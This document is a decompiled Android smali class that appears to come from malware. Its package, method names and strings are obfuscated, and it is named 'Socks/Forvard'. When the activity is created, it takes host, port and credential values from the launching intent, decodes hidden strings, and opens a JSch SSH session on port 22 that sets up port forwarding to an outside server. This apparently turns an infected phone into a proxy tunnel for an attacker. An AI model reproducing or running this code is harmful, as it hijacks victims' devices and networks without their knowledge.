.class public Lcompse/refact/st/upsssss/Socks/Forvard;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public fsafsdfsfsdfsfsdfsd()V
    .locals 8

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Socks/Forvard;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, ">\u0008=\u001a"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "eqgj"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\u001c=\u001b"

    invoke-static {v3}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "fjtlaMz}~m"

    invoke-static {v4}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const v4, 0x86c4

    :try_start_0
    new-instance v5, Ljava/util/Properties;

    invoke-direct {v5}, Ljava/util/Properties;-><init>()V

    const-string v6, "::\u001b\'\n:!!\u001a:\"+\u0010\r\u0001+\n%\u0000 \u000e"

    invoke-static {v6}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "{q"

    invoke-static {v7}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/Properties;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v6, Lcom/jcraft/jsch/JSch;

    invoke-direct {v6}, Lcom/jcraft/jsch/JSch;-><init>()V

    const/16 v7, 0x16

    invoke-virtual {v6, v3, v0, v7}, Lcom/jcraft/jsch/JSch;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;I)Lcom/jcraft/jsch/Session;

    move-result-object v3

    const-string v6, "*\u0000<\u000c-\u001dc\u001d-\u0019\'\u0019"

    invoke-virtual {v3, v1}, Lcom/jcraft/jsch/Session;->serfwefewfwefewef(Ljava/lang/String;)V

    invoke-virtual {v3, v5}, Lcom/jcraft/jsch/Session;->fsafsdfsfsdfsfsdfsd(Ljava/util/Properties;)V

    invoke-virtual {v3}, Lcom/jcraft/jsch/Session;->fsafsdfsfsdfsfsdfsd()V

    invoke-static {v6}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Lcom/jcraft/jsch/Session;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Lcom/jcraft/jsch/Channel;

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    const-string v2, "/\');.;.;/"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v0, v1, v2, v4}, Lcom/jcraft/jsch/Session;->sdfsdfsdfsdf(Ljava/lang/String;ILjava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4

    const/4 v3, 0x1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    new-instance v0, Lcompse/refact/st/upsssss/Socks/fsafsdfsfsdfsfsdfsd;

    invoke-direct {v0, p0}, Lcompse/refact/st/upsssss/Socks/fsafsdfsfsdfsfsdfsd;-><init>(Lcompse/refact/st/upsssss/Socks/Forvard;)V

    new-array v1, v3, [Ljava/lang/Integer;

    const/4 v2, 0x0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Lcompse/refact/st/upsssss/Socks/fsafsdfsfsdfsfsdfsd;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    return-void
.end method
